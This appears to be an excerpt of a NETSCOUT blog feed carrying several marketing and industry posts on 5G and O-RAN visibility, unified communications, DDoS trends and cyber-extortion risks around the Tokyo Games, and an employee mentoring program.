<p>History shows that there are bound to be hiccups along the way. At the onset of the 4G era, gaps in service sometimes caused jarring handoffs as devices transitioned from <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="d0af380f-adf6-4296-915b-90fad7a01b9e" href="http://localhost:7996/what-is/2g-3g-4g" title="What is 2G, 3G, 4G?">4G/LTE </a>connections to slower 3/2G networks. Similar network challenges today could erode the end-user experience of 5G—with potentially more dire consequences, given expectations for the technology to connect autonomous vehicles, remote surgical suites, virtual reality, industrial Internet of Things (IoT) robots, and more.</p>

<p>These factors make it even more important for carriers and enterprises rolling out 5G networks to have the proper tools in place to understand in real time when network failures happen. It’s critical to know what’s driving experience issues across the increasingly distributed network edge to ensure long-term reliability.</p>

<p><strong>Visibility Is Key to 5G Service Assurance </strong></p>

<p>Network visibility is vital for many reasons, but it’s especially essential for avoiding problems down the road for 5G engineering and operations teams charged with monitoring, running analytics, and ensuring network security.</p>

<p>For example, to ensure that 5G cells deliver expected latency, bandwidth, and connectivity for individual subscribers and devices and optimize efficiencies in response to traffic patterns and topology change, RAN operation teams need deep visibility into the radios. Millimeter-wave (mmWave)-based services are particularly prone to path loss and limitations in penetrating hard surface areas, and visibility into the network can help validate coverage models.</p>

<p>Another key 5G service offering is network slicing, which is the partitioning of a network by using virtual resources to provide a network with specific attributes (such as ultra-low latency, ultra-high bandwidth, or high density of devices) to better serve a particular application, customer, or class of IoT devices and services. The ability to see and monitor these virtual network slices (as a network within a network) to assure service quality is indispensable for network operations teams.</p>

<p>Visibility is also critical for virtual resources such as containers that serve microservices from the RAN to the edge to the core, which may need to be dynamically spun up or down as needed. To respond in real time to rapidly changing traffic and device density with on-demand virtual infrastructure, mobile operators must employ orchestration. And to achieve this level of automation, orchestrators need real-time smart data—data prepared and organized at the collection point, so it is ready and optimized for analytics at the highest quality and speed—to inform it.</p>

<p>Finally, to leverage the 5G network, mobile operators will want to monetize these new virtual network resources by providing service-level guarantees for an application or class of devices. They will want to take advantage of analytics to conceive new revenue-generating services. To do that, they need complete visibility and reporting to assure and validate delivery with the customer.</p>

<p>In each of these cases, visibility needs to be pervasive, cloud optimized, and real-time to make it actionable. Access to a single source of truth is vital. And the only way to ensure these qualities is via the use of smart packet data.</p>

<p><strong>Smart Data: The Visibility Carriers Need for 5G Service Assurance</strong></p>

<p>As mobile operators roll out 5G networks and services, packets are the one true source of reliable insight that engineering and operations teams have for peering into customer experience, performance, and security in this complex environment. The simple fact of the matter is that packets never lie.</p>

<p>By using software-based instrumentation such as NETSCOUT’s carrier-grade <a href="https://www.netscout.com/product/isng-platform?ls=PR6-MKTG&amp;lsd=pr-022119-2">InfiniStreamNG (ISNG) smart data platform</a>, service providers gain access to a high-fidelity, centralized view of performance across all infrastructure and application components, regardless of system or manufacturer. This invaluable knowledge provides the foundation for service assurance, allowing failures to be addressed in near real time, as well as for sophisticated AI/ML-based orchestration, analytics, and security.</p>

  <title>Growing Reliance on UC&amp;C Systems Puts IT Pros to the Test</title>
  <link>http://localhost:7996/blog/growing-reliance-ucc-systems-puts-it-pros-test</link>
  <description>In order to manage the performance and security needs associated with complex UC&amp;C systems, IT needs a holistic view into the interconnected broader environment.</description>
  <content:encoded><![CDATA[<p>Unified communications and collaboration (UC&amp;C) systems have been an important business tool for some time now, but the arrival of the COVID-19 pandemic turned remote connectivity into a crucial business lifeline. Our increased reliance on tools such as video conferencing, instant messaging, email, and calendar systems forces IT to manage an increasingly complex environment. When home Wi-Fi connections and cloud-based components are added to the equation, the challenge of managing these systems becomes <a href="https://www.netscout.com/blog/it-network-challenges-poll">even greater for IT</a>.</p>

<p>Clearly, as these unified systems become ever-more mission-critical, IT professionals must solve the complexity problem in order to deliver near-flawless and secure user experiences across the board.</p>

<p>The question is, how? That was the topic under discussion by industry experts in a recent OnGuard webinar.</p>

<p>Many times, UC&amp;C components represent something of a double-edged sword for IT. For example, as UC&amp;C components are increasingly outsourced, IT enjoys advantages by reducing the burden of managing the infrastructure. At the same time, that loss of control can also presents challenges, explained Paul Barrett, chief technology officer for NETSCOUT's enterprise and federal business. “When an organization outsources UC&amp;C components, IT isn’t necessarily off the hook, because when things stop working, the first thing users will do is complain to IT,” he said. “And since the infrastructure is now spread across multiple providers, when problems crop up, it becomes quite difficult to pinpoint exactly where this issue is occurring in order to convince a particular provider to accept responsibility.”</p>

<p><strong>The Importance of Security </strong></p>

<p>Although UC&amp;C performance is incredibly important, security is equally vital to the success of any business. “As enterprises move to hosted UC&amp;C, IT must focus on the security of these communications to ensure that confidential information stays confidential. Encryption is critical,” said Eric Gray, chief solutions architect for NETSCOUT. In fact, he pointed out, there’s an ongoing debate about whether enterprises should require VPNs when granting remote workers direct access to hosted UC&amp;C platforms. “While this approach will deliver better performance, it may also expose the business to security-related issues,” he said.</p>

<p>One way to introduce a level of firewalling is to use a VPN to provide remote workers access into the corporate environment, utilizing connectivity from the data center back to the hosted environment. In this way, security professionals can inspect for malware and check for viruses, while ensuring employees are adhering to the proper levels of encryption.</p>

<p><strong>The Growing Need for a Holistic View of Complex Systems </strong></p>

<p>The final piece of the puzzle IT needs for managing the performance and security of complex UC&amp;C systems is a holistic view into the interconnected broader environment.</p>

<p>“Today’s heavy reliance on UC&amp;C is putting greater user load through internet pipes to a company’s data center or colocation,” said Ray Krug, director of product marketing for NETSCOUT. “This then puts more strain on VPN concentrators. That’s why monitoring choke points becomes so critical. With so many people still working from home, and many others returning to the office, there’s increased traffic coming into data centers. As a result, IT has to be sure they’re aware of how their infrastructure is coping with what's going on. Visibility end through end is more critical than ever to assuring a good UC&amp;C experience.”</p>

<p>Barrett pointed out that the hybrid nature of today’s workforce is also altering the traffic profile of the network and concurred with Krug that IT must be prepared to understand what's happening, and what the implications of those changes are to the systems that users depend on day in and day out.</p>

  <title> Today’s New Business Normal Creates Threat Opportunities </title>
  <link>http://localhost:7996/blog/todays-new-business-normal-creates-threat-opportunities</link>
  <description>In the wake of COVID-19, enterprises need to develop short- and long-term strategies to counteract shifting threats to networks and applications.</description>
  <content:encoded><![CDATA[<p>The COVID-19 pandemic forced businesses of all shapes and sizes to make rapid changes in how they operated, with employees predominantly working remotely and sensitive data and systems being accessed from outside the office.</p>

<p>For many, this triggered an increased reliance on remote-access infrastructure and cloud-delivered services. IT departments rushed to install, expand, or upgrade remote desktop access (RDA) servers, <a href="https://www.netscout.com/blog/remote-working-here-to-stay">virtual private network (VPN) concentrators</a>, and remote access routers to meet surging workforce demand for remote access to data centers. Moreover, widespread reliance on video conferencing apps forced many businesses to upgrade enterprise wide-area network and local-area network capacity, as well as to reevaluate routing and DNS resolution paths within the network.Enterprises also quickly began to adopt software-as-a-service (SaaS) and cloud applications to handle the large scale and rapid modifications required by the sea change in remote work practices.</p>

<p>Not surprisingly, cyberattackers were quick to spot an opportunity. 2020 saw <a href="https://www.netscout.com/blog/asert/crossing-10-million-mark-ddos-attacks-2020">record-breaking attacks</a> targeting vulnerabilities brought about by these new business practices, putting security professionals on the defensive.</p>

<p><strong>Shifting Threat Tactics </strong></p>

<p>Threat tactics are constantly evolving. Cyberattackers are preying on the anxieties surrounding the pandemic to exploit new opportunities for perpetrating fraud. According to the recently published HardenStance white paper “Cyber Security After the Pandemic,” several tried-and-true tactics are being modified to the current environment. For instance, lure attacks have taken on COVID-19 themes. Email, SMS, and other messaging applications were used in the early days of the pandemic to prey on victims’ fears regarding personal protective equipment (PPE) shortages, contact tracing, and more recently, fraudulent vaccine passport requirements.</p>

<p>Distributed denial-of-service (DDoS) attacks also have been on the rise, as attackers unleashed <a href="https://www.netscout.com/threatreport">more than 10 million DDoS attacks in 2020</a>. Because of the shift to remote work, attackers increasingly targeted on-premises VPN concentrators. Another trend has been the rise of <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">DDoS extortion attacks</a>, also known as ransom DDoS. In fact, the threat actors behind the Lazarus Bear Armada DDoS extortion attacks targeted VPN concentrators as part of their campaign.</p>

<p><strong>The Importance of Developing Security Strategies </strong></p>

<p>Although the future is always difficult to predict, one thing is certain: cyberattacks will not abate. That means enterprises need to develop both short- and long-term strategies for combatting these attacks.</p>

<p>In the short term, security professionals will need to focus on plugging the holes that have emerged since the lockdowns began. The HardenStance white paper recommends implementing cloud security controls in development environments, preventing VPN concentrators from being easily identified by probing attackers, and upgrading to a dedicated DDoS protection capability.</p>

<p>In the long term, enterprises should develop well-thought-out strategies that put security first in this ongoing battle against cybercombatants.</p>

  <title>Will the Tokyo Games Be a Target for Cyber Extortionists? </title>
  <link>http://localhost:7996/blog/cyberattacks-target-summer-games</link>
  <description>Modern-day games such as the summer event in Tokyo require a massive digital infrastructure, from telecommunications to digital scoring and video streaming. That makes them juicy targets for cybercriminals.</description>
  <content:encoded><![CDATA[<p>Global sporting events such as the Tokyo Games have always been a world stage, showcasing not only amateur athletic brilliance, but also the host country. Pulling off a successful event costs billions, but it also serves as an invaluable marketing campaign. With this year’s summer games in full swing and the lockout of tourists and spectators, the digital infrastructure has never been more important for delivering the excitement of the games and the appeal of the host country.</p>

<p>However, such a high-profile undertaking also brings risks, and the impact of cybercrime activity is one of them.</p>

<p>Modern-day games such as the summer event in Tokyo require a massive digital infrastructure, from telecommunications to digital scoring and video streaming. Moreover, the global viewing footprint means much of that infrastructure depends on internet access. All of this adds up to a juicy target for adversaries to attack and take down the digital infrastructures needed to run and televise the games.</p>

<p>Indeed, threat actors have been targeting these events for at least a decade, starting with the 2008 Beijing event. London’s games in 2012 sustained repeated <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service</a> (DDoS) attacks, including a 40-minute attack on the central venue's power systems that was likely intended to disrupt the opening ceremony.</p>

<p>The activity increased further in the 2016 games in Rio de Janeiro, where event-affiliated organizations were targeted by a large-scale DDoS attack from a DDoS-for-hire service known as LizardStresser. According to <a href="https://www.tripwire.com/state-of-security/security-data-protection/cyber-security/how-a-massive-540-gbsec-ddos-attack-failed-to-spoil-the-rio-olympics/">research</a> from NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT), the activities launched prior to the opening of the games and increased significantly after the games got underway.</p>

<p>It would be no surprise if this were to happen again at this year’s Games—indeed, a recent threat assessment from the <a href="https://cyberthreatalliance.org/">Cyber Threat Alliance</a>, a collaborative group of cybersecurity practitioners that work together to improve global cybersecurity defenses, notes that “CTA members assess that the [Tokyo Games] will be a prime target for cybercriminals due to the large number of potential victims leveraging online systems.”</p>

<p>In particular, the report noted the increased threat of ransomware and cyber extortion attacks, because “entities supporting the Games may have low downtime tolerance depending on the types of services they provide—especially during the event itself—making them key targets…”</p>

<p><a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="b0284809-4eb5-4d90-9897-6f27d22e9a77" href="http://localhost:7996/asert" title="ASERT">NETSCOUT’s ASERT</a>, a CTA member and contributor to the CTA report, has seen a massive increase in cyber extortion as cybercriminals have launched new methods, from DDoS extortion to triple extortion. In the latter attack, threat actors integrate DDoS attacks into a ransomware-as-a-service (RaaS) portfolio to create the so-called triple extortion attack. Here’s how it works:</p>

<ol><li><strong>Encryption. </strong>With the traditional ransomware attack method, cybercriminals breach a network and encrypt valuable data, making it (and sometimes the entire system) unavailable to the victim organization. The attackers then demand payment in return for a decryption key.</li>
	<li><strong>Theft.</strong> Here, cybercriminals exfiltrate the data before locking the victim out. They then threaten to expose and/or sell the stolen data publicly unless paid. This second level of extortion makes it harder for victims to ignore ransomware threats, because even those who can use backups to restore data remain at risk of data exposure. Clearly, it’s a valuable monetization tool: <a href="https://www.coveware.com/blog/q3-2020-ransomware-marketplace-report#:~:text=Average%20Ransomware%20Increases%20as%20Attackers%20Target%20Bigger%20Companies&amp;text=The%20average%20ransom%20payment%20increased,to%20drag%20the%20averages%20up.">Coveware</a> estimates that nearly half of ransomware cases in the third quarter of 2020 used exfiltration tactics.</li>
	<li><strong>DDoS attack.</strong> Commonly used as a <a href="https://www.netscout.com/blog/asert/lazarus-bear-armada-ddos-extortion-campaign-december-2020">standalone extortion method</a>, DDoS attacks now are on the list of services operators offer. This further ratchets up the pressure on the victim in a couple of ways: First, it emphasizes the seriousness of the adversary. And second, maintaining availability adds another stressor to a security team already dealing with the first two events.</li>
</ol><p>Will this year be the year bad actors use all three against the event and affiliated organizations? There’s a very good chance this can happen. Geopolitical unrest plays a major role in bad actor activity, and the CTA report notes that nation-state actors pose the highest threat to the games. From the host country to the games committee, sponsors, and even individual competing nations and athletes, keeping a strong cybersecurity posture is vital. Information sharing and collaboration with commercial providers such as telecommunications companies and internet service providers is particularly important, because these organizations often are on the front line when it comes to experiencing cyberattacks.</p>

<p>As we have in the past, NETSCOUT has partnered with such support entities to protect them from DDoS attacks and other cybersecurity threats.</p>

  <content:encoded><![CDATA[<p>Today’s digital business models have transformed the way many companies operate, giving employees greater flexibility to work remotely as well as in the office. In response, NETSCOUT has reimagined service assurance for the hybrid enterprise with NETSCOUT Smart Edge Monitoring—a new, patent-pending architecture that combines smart data analytics with synthetic transaction testing. With Smart Edge Monitoring, IT teams gain complete visibility and insights to deliver top-quality user experience across networks or applications, regardless of where end users perform their jobs.</p>
<p>“IT organizations face big decisions in managing and advancing their networks and management approaches, which became even more urgent during the pandemic on multiple fronts—from operations to optimization, from resolution to readiness, and from core and cloud to edge and client,” says Mark Leary, research director for network analytics at IDC. “To address the next normal in network management, ITOps needs to be able to diagnose whether applications, clients, services, or network infrastructure are causing performance problems. Here, it is vital to pinpoint and resolve service degradation issues across any domain rapidly and accurately.”</p>
<p>Smart Edge Monitoring overcomes one of IT’s biggest challenges in problem identification and resolution in complex, multivendor environments. By using integrated analysis, the solution quickly understands what the end-user experience is and exactly why issues are occurring. As a result, this unique solution drives significant reductions in time to resolution for any application issue, including SaaS, UCaaS, VoIP, video, and data.</p>
<p>By combining synthetic testing and packet analysis, Smart Edge Monitoring detects emerging problems as early as possible, helping IT teams quickly pinpoint why and where they are happening. Although historically, siloed tools might have provided either the why or where analysis, Smart Edge Monitoring merges the two with integrated analysis and logical workflows that dramatically reduce end-user impact and the time required to solve complex issues. Example use cases include:</p>
<p><strong>Unified Communications as a Service (UCaaS)</strong>. When users at home, branch or remote offices, or headquarters experience poor performance on platforms such as Webex, Microsoft Teams, and Zoom, Smart Edge Monitoring identifies problems, including join-meeting delays and poor audio and video quality.</p>
<p><strong>Work</strong>-<strong>from-Home</strong>. With a significant percentage of companies operating a hybrid workforce model, Smart Edge Monitoring provides early detection of performance degradation with analysis throughout the transaction ecosystem—from home-user network; across the WAN; to data center, application, and database servers; and to cloud and SaaS providers—to quickly pinpoint the problem.</p>
<p><strong>Cloud. </strong>Cloud migrations can have gaps in visibility that lead to performance challenges post-launch. Smart Edge Monitoring baselines the user experience before, during, and after cutover to cloud-based applications to help mitigate such issues.</p>
<p>“The reality is that the massive shift toward remote work over the past year has exposed fundamental blind spots,” says Michael Szabados, chief operating officer at NETSCOUT. “When performance problems begin to develop for the remote user, our smart data transaction tests act much like a smoke detector alerting of a potential problem, which subsequently can be quickly extinguished with the powerful nGeniusONE service triage workflows.”</p>
<p>Available immediately, Smart Edge Monitoring comprises nGeniusPULSE nPoints at user locations, including home or remote offices, and InfiniStreamNG at strategic network, data center, and cloud locations, with Omnis Cloud Adaptor providing packet-based analysis on synthetic testing. These data sources leverage NETSCOUT’s patented Adaptive Service Intelligence (ASI) technology to provide smart data for smarter analytics with nGeniusPULSE and nGeniusONE Service Assurance platforms.</p>

  <title>Our New DDoS Normal Isn’t All That Normal</title>
  <link>http://localhost:7996/blog/asert/our-new-ddos-normal-isnt-all-normal</link>
  <description>Attack frequency has dropped, but we are nowhere near the numbers considered normal prior to COVID-19: Threat actors launched approximately 5.4 million DDoS attacks in the first half of 2021.</description>
  <content:encoded><![CDATA[<h2>Summary</h2>

<p>Yes, the first half of 2021 saw yet another record broken when it comes to global distributed denial-of-service (DDoS) attacks—but that’s not the full picture. After an astonishingly active first quarter of DDoS attack activity, things calmed down a bit for the second quarter of 2021. Unfortunately, “calmed down” is a relative term. Think of a toddler throwing a full-blown temper tantrum versus one whining constantly and loudly. One is certainly calmer, but neither scenario could be called great. </p>

<h2>Details</h2>

<p>According to research from NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT), threat actors launched approximately 5.4 million DDoS attacks in the first half of 2021, an 11 percent increase from the same time period in 2020. Any way you slice it, that’s not a fun number and puts the world on track to hit close to 11 million DDoS attacks in 2021. But Q2’s numbers do show some signs of abatement:</p>

<ul><li>ASERT observed 2,488,048 attacks in the second quarter, a 13 percent decrease compared with the first quarter’s extraordinary number of 2,863,882.</li>
	<li>The second quarter 2021 numbers also decreased by 6.5 percent compared with the same period in 2020. </li>
	<li>In June, monthly DDoS attack numbers dropped below 800,000 for the first time since March 2020, to 761,914. </li>
</ul><p class="text-align-center"><strong>Second Quarter 2021</strong><br />
Total attacks: 2.48 million<br />
Max size: 530 Gbps<br />
Max throughput: 391 Mpps<br />
Average duration: 59 minutes</p>

<p><br />
But although attack frequency has dropped, we are nowhere near the attack numbers that were considered normal prior to the onset of the COVID-19 pandemic. To put things in perspective, we pulled data from the before the pandemic: 2019. In comparison, the second quarter numbers from 2021 showed a continued high level of activity: </p>

<ul><li>13 percent more attacks in 2021 than 2019</li>
	<li>The lowest monthly number of attacks for Q2 21 came in June, with 761,914 attacks. That low number nonetheless topped the high-water mark of Q2 2019: April’s 755,748 attacks.</li>
</ul><figure role="group" class="caption caption-img align-center"><img alt="Quarterly DDoS Attacks" data-entity-type="file" data-entity-uuid="a0b9d387-761f-4ccb-a47b-27cbeacf37bf" src="http://localhost:7996/sites/default/files/inline-images/CS-051-EN-2101-_WEB_.jpg" /><figcaption>Figure 1: Second Quarter Monthly DDoS Attacks</figcaption></figure><p> </p>

<p>Several other things jumped out from our review of both quarterly and first-half statistics for 2021.</p>

<ul><li>The top five DDoS attack vectors seen in the first half of 2021 were TCP ACK, DNS amplification, TCP SYN, TCP RST, and TCP SYN/ACK amplification.</li>
	<li>Attackers continue to find value in pouring on faster, more difficult-to-mitigate attacks. Adversaries ratcheted up throughput considerably, with the max throughput recorded increasing by 65 percent compared with Q1 2020.</li>
	<li>When it comes to attack duration in Q2 2021, attacks of five to ten minutes continued to top the list, used by 38 percent. We also saw a slight increase in attacks lasting between 10 minutes and an hour compared with Q1 duration numbers.</li>
</ul><h2>Conclusion</h2>

<p>Adversaries will never turn down an opportunity for innovation—and the COVID-19 pandemic provided an enormous one. As such, the pandemic’s long tail of cyberthreat innovation will likely continue well into 2021 as cybercriminals continue to discover and weaponize new attack vectors that exploit pandemic-related vulnerabilities.</p>

  <title>Ready Now for 5G CBRS?</title>
  <link>http://localhost:7996/blog/ready-now-5g-cbrs</link>
  <description>To prepare for deployment of 5G CBRS, cable/MSOs must have visibility into the full lifecycle of CBRS/Wi-Fi rollouts—from the network design to full operation—while maintaining network excellence.</description>
  <content:encoded><![CDATA[<p><i>Authored by Praveen Chandel and John English</i></p>

<p>Almost a year ago, the United States Federal Communications Commission (FCC) released a 150MHz-wide broadcast band (3550MHz to 3700MHz) for public use in commercial wireless services.</p>

<p> This frequency spectrum is available to all communications service providers regardless of whether they have existing licensed spectrum. Citizens Broadband Radio Service (CBRS) is a lightly licensed band featuring a dynamic spectrum access system that manages the allocation of frequencies in this shared-spectrum range. The flexibility of CBRS makes it an ideal solution for cable/multiple systems operators (MSOs), all other communications service providers, and many types of enterprises. <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="a98aac63-9122-4469-be74-49835f265302" href="http://localhost:7996/demo/cable-providers-msos" title="How to Monitor CBRS 5G">5G CBRS</a> can provide support for Internet of Things (IoT) networks, edge computing, and private 5G networks.</p>

<p>For the cable/MSOs, CBRS is a small-cell network designed to complement the cable/MSO Wi-Fi network. The shared radio spectrum enables low-cost radio active network (<a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="54d39b1b-dcfb-4234-b3e7-bc30bc2fb960" href="http://localhost:7996/solutions/ran-network-solutions" title="RAN Optimization &amp; Automation: Carrier-Ready, Future-Proof Evolution ">RAN</a>) modules that can utilize unlicensed 5GHz, which is now available to augment existing 4G/LTE CBRS. Although CBRS now offers cable/MSOs the ability to augment their Wi-Fi network and 4G CBRS networks with 5G cellular to provide better coverage, increased bandwidth, and lower latency, there is an essential need for tools that also provide the visibility that allows providers to seamlessly assure and troubleshoot both a new 5G CBRS and the combined CBRS/Wi-Fi network.</p>

<p>NETSCOUT has worked with CBRS early adopters in their labs, “friendlies” field trials, and drive tests to provide visibility and Smart Data support throughout the full product lifecycle of this new service via a holistic set of service assurance and analytics tools.</p>

<p><strong>Confidence to Innovate</strong></p>

<p>To prepare for deployment of 5G CBRS, cable/MSOs must have visibility into the full lifecycle of CBRS/Wi-Fi rollouts, from the network design to full operation, while maintaining network excellence. Starting with the 5G CBSD RAN planning, cable/MSOs need propagation modeling to guide cost-effective CapEx investment that delivers the desired and optimum coverage and performance thresholds. RAN interoperation and troubleshooting requires a session analysis capability that provides deep visibility into the RAN. Ongoing performance monitoring and optimization requires 24x7 visibility and key performance indicators (KPIs). Operators can further enhance their 5G network operation by employing a closed feedback loop for automation fed by Smart Data.</p>

<p>NETSCOUT’s service assurance, analytics, and security solution, which is based on smart data derived from smart visibility, provides market-readiness intelligence, predictive service assurance, actionable insights, and subscriber troubleshooting from the RAN to the core. For service assurance, the NETSCOUT solution provides proactive performance monitoring on accessibility, usability, and retainability.</p>

<ul><li>NETSCOUT visibility of the control plane renders insights on user access to the CBRS network by looking at the number of attachments, registrations, and authentications along with policy interactions.</li>
	<li>Usability measures the performance of voice, video, and data services (including OTT) observed on the user plane for KPIs such as latency and throughput for both the RAN and core network across regions and markets.</li>
	<li>Retainability metrics look at users and devices that have attached to the network and are accessing services in order to determine whether the service quality is consistent and to identify service degradations—before service failure.</li>
</ul><p>For the RAN, smart visibility must reach down to the critical measurements including Reference Signal Receive Power (RSRP) and Radio Resource Control (RRC) for planning, operation, and optimization. This data enables RAN engineering to identify poor coverage areas and determine whether new sites are required in these areas and/or provide information about the number of subscribers being affected.</p>

<p>Fed by Smart Data heat maps composed for RRC, connection requests look at subscribers and connections to provide additional insights, such as whether additional sites (small cells) are required in a high-traffic area. These types of maps often are exported to and used by RAN planning tools. Other maps indicating geographic traffic distribution are available, including those for areas of high dropped connections and dropped RRC connections due to interference (poor Reference Signal Received Quality, or RSRQ).</p>

<p>UltraHD visibility based on Smart Data provides service assurance continuity from Wi-Fi to a hybrid CBRS/Wi-Fi system. NETSCOUT provides a full vendor-independent CBRS/Wi-Fi lifecycle network equipment solution for service assurance, business analytics, and cybersecurity, with multi-technology network support that helps cable/MSOs deliver superior customer experience. In concert with , NETSCOUT provides a cloud-native software-based solution that offers the lowest TCO.</p>

<p>Cable/MSOs that deploy CBRS systems can save money and improve coverage and service levels, but only if they are truly ready to support this new cellular service. With NETSCOUT, cable/MSOs are ready for 5G CBRS.</p>

  <title>United Kingdom Under Attack</title>
  <link>http://localhost:7996/blog/uk-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for the United Kingdom</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of distributed denial-of-service (DDoS) attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our weekly series focuses on DDoS activity in specific countries.

  <title>Insourcing IT Operations: No Longer a Fully “In-House” Transition</title>
  <link>http://localhost:7996/blog/insourcing-it-operations-no-longer-in-house-transition</link>
  <description>Managing insourced data center operations transitions with NETSCOUT service edge visibility</description>
  <content:encoded><![CDATA[<p>Organizational moves involved in transitioning data center and IT operations from a managed service or business process outsourcing (BPO) model back to an insourced solution pose high-risk considerations for any business.</p>

<p>For one, the motivations often vary for moving back to an in-house model, with expense controls, business and service delivery transitions, and underperforming managed service providers usually topping the list. The enterprise has likely seen effects related to transitions in the BPO’s service delivery environment over the course of its negotiated service level agreement (SLA). With more organizations moving to the cloud in response to hybrid workforce and business continuity concerns, these BPOs have expanded their solution portfolios, exponentially increased their customer base, added IT personnel, and quite likely expanded their service delivery network with additional regional sites.</p>

<p>Historically, insourcing data center operations has presented IT leadership with some tall tasks, including hiring staff and selecting vendor technology to replace what was formerly delivered by the BPO, establishing new secure sites, and then implementing multi-tier network and applications infrastructures, all with high scrutiny and tight deadlines.</p>

<p>One leading <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="be96f8ea-33d3-4f7d-8e28-8df883ab0f90" href="http://localhost:7996/solutions/manufacturing" title="Manufacturing">manufacturer</a> realized there was a better route to negotiating its own insourced IT operations transition, just as the hybrid workforce era was arriving and the company’s ability to produce and distribute much-needed household goods was at a higher-than-ever premium.</p>

<p>Rather than simply reestablishing an entirely on-premises data center network, this manufacturer’s modernized IT operations design featured carrier-neutral facilities (CNFs) that enabled IT leadership to mix and match multiple telecommunications and ISPs and co-located data centers in a manner that best suited the company’s project requirements, timeline, and expense controls.</p>

<p>See how NETSCOUT’s service edge visibility and <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="e0be3f25-5c8c-44ff-aa0e-e2117ed61961" href="http://localhost:7996/product/ngeniusone-platform" title="nGeniusONE Solution for Enterprise Performance Management">nGenius</a><a href="https://www.netscout.com/product/ngeniusone-platform"> </a>visibility as a service consultative approach helped IT leadership manage this insourced transition, all the while improving visualization into smart-factory environments during a critical production period for this manufacturer.</p>

  <title>Paying It Forward</title>
  <link>http://localhost:7996/blog/paying-it-forward</link>
  <description>NETSCOUT Guardians support each other’s career development with grassroots mentoring program.</description>
  <content:encoded><![CDATA[<p>By Steve Sviontek</p>

<p>Years ago, when I was a brand-new employee of NETSCOUT working as an entry-level customer support engineer, I ran into a customer situation involving a piece of our technology with which I was unfamiliar.</p>

<p>As I struggled to resolve the issue, a senior member of the engineering team whom I’d never met came to my cubicle with the device. He then proceeded to take the device apart and spent about an hour explaining in detail how it worked, giving me the necessary information and knowledge to resolve the issue for the customer.</p>

<p>I thanked him profusely, and his response has stuck with me over the years: “That is how we do it here. Make sure you pay it forward and always take the time to help someone who needs help or teach them if they don’t know something.” I have spent my career here at NETSCOUT trying to live up to that example.</p>

<p>When you meet people who have achieved success in their careers, a brief conversation will almost always reveal that their success can be attributed at least partially to intervention or advice from a respected coworker with more experience, knowledge, or wisdom. How many others could be successful if only they had the same support?</p>

<p>That’s what I love about NETSCOUT’s mentoring program. The goal of the program is to provide career and leadership skills improvement for our employees via interpersonal interactions and mutual learning of paired staff.</p>

<p>Once the mentor pairings are settled, the formal part of the program lasts about six months. It’s completely inclusive—open to all employees, at all levels, in all locations, in any job function. The goal is to create long-lasting relationships while providing support and enabling employees to take ownership of their career paths. Many of the program’s previous pairings have resulted in ongoing relationships that continue to benefit both the mentors and the mentees. The great part about this program is that you don’t need a network of connections to find a mentor—anyone can take advantage of the opportunities afforded by the program.</p>

<p>The program itself continues to mature, with the original team of two people now consisting of five employees who volunteer their time.&nbsp;We also have seen positive continued growth in the program over the last three years. There are regular check-ins and forums for the participants, and an online resource library has been established and is constantly updated with useful articles and references. At the end of the six months, the participants are surveyed, and those results are used to continue to improve the program. In fact, many features of the program are a direct result of feedback from previous participants. Survey results showed that 94 percent were able to achieve the goals they set at the beginning of the program. Most mentors and mentees agree that this program empowers individuals to take more control over their career development and state that they would recommend it to others.</p>

<p>As for me, I served as a mentor in the first year of the program and have been involved ever since. It’s just one more way for me to continue paying forward something that was given to me a long time ago, and it’s impacted many people I have worked with since. And that person who helped me? Well, we still work together, and he’s still providing that mentorship to others.</p>

  <title>Open Doesn’t Mean It’s Easy</title>

  <description>O-RAN promises best-of-breed solutions to mobile operators for TCO and service agility but brings with it the complexity of a multivendor cloudified RAN.</description>
  <content:encoded><![CDATA[<p><i>By Robert Froehlich and John English</i></p>

<p>Open Radio Access Network (O-RAN) disaggregates the RAN into cloud-based service functional systems in which the usually integrated and proprietary base station is broken into three service components: radio unit (RU), distributed unit (DU), and central unit (CU).</p>

<p>There are several good reasons for O-RAN. First of all, O-RAN promises a best-of-breed approach that lets mobile operators pick the radio from one vendor, the distribution unit from another, and so on. In that way, the mobile operator’s RAN is not subject to the costs, product limitations, and delivery timeline of one vendor for the entire base station.</p>

<p>Meanwhile, multi-access edge computing further drives the need for a disaggregated RAN, with a range of enterprise use cases in which both the RAN and the core functions may be divided between the enterprise premise, the access network, and the core network as required by the 5G service application. And finally, for the operation of a cloud RAN, artificial intelligence (AI)-enabled RAN services and O-RAN interfaces for policy will be essential.</p>

<p>All of this sounds great. But of course, these benefits come with new challenges.</p>

<p><strong>O-RAN Challenges</strong></p>

<p>Looking at the transport layer through the CU, DU, and RU, early adopters are reporting IP transport issues for basic interconnection between the various RAN functions that have been “broken up.” At the same time, carriers are reporting security concerns associated with cloud management of IP transport.</p>

<p>With the O-RAN architecture, operators are expecting the CU to support as many as hundreds of DUs. Accordingly, they must manage CU/DU scaling and DU performance along with inter/intra-cell handover performance and vendor interoperation, all in a cloud environment.</p>

<p>For the control plane, carriers must look at CU performance, inter/intra-CU handover issues, and vendor interoperability. For the user plane, the focus must be on performance and on ensuring QoS/QoE to achieve expected levels of <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="9a28c40e-7f65-4841-9cc9-60c943f85f94" href="http://localhost:7996/what-is/5G" title="What is 5G?">5G services</a>.</p>

